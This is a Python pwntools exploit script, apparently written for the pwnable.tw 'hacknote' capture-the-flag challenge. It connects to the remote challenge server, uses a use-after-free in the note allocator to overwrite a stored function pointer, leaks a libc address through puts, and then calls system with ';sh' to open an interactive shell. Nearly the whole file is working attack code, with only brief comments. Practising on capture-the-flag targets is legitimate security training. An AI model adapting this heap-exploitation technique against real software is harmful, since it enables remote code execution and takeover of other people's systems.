from pwn import *

#r = process("./H", env={"LD_PRELOAD" : "./libc.so.6"})
r = remote('chall.pwnable.tw',10102)
def create_note(size,content):
    r.sendafter(b'Your choice :',b'1')
    r.sendafter(b'Note size :',size)
    r.sendafter(b'Content :',content)

def delete(idx):
    r.sendafter(b'Your choice :',b'2')  
    r.sendafter(b'Index :',idx)

def print_note(idx):
    r.sendafter(b'Your choice :',b'3')  
    r.sendafter(b'Index :',idx)

puts_got = 0x804a024
system_offset = 0x3a940
count = 0x0804a04c
puts_offset = 0x0005f140

##### create_note
## malloc(8) : call_function | ptr to next malloc(use for print_note)
## malloc(size)

### we can change call_function to any function we want to call

## UAF in first malloc ptr when malloc called
## 
create_note(b'8',p32(puts_got)) # 1 
delete(b'0')
delete(b'0')
### get second ptr of size 8 chunks
create_note(b'16',b'/bin/sh')  # 2

### leak libc using puts(puts_got)
create_note(b'8',p32(0x804862B)+p32(puts_got)) # 3 
print_note(b'0')
leak = u32(r.recv(4)) - puts_offset
print(hex(leak))
### call system(sh)
delete(b'2')
create_note(b'8',p32(leak+system_offset)+b';sh\x00') # 4 
print_note(b'0')
r.interactive()


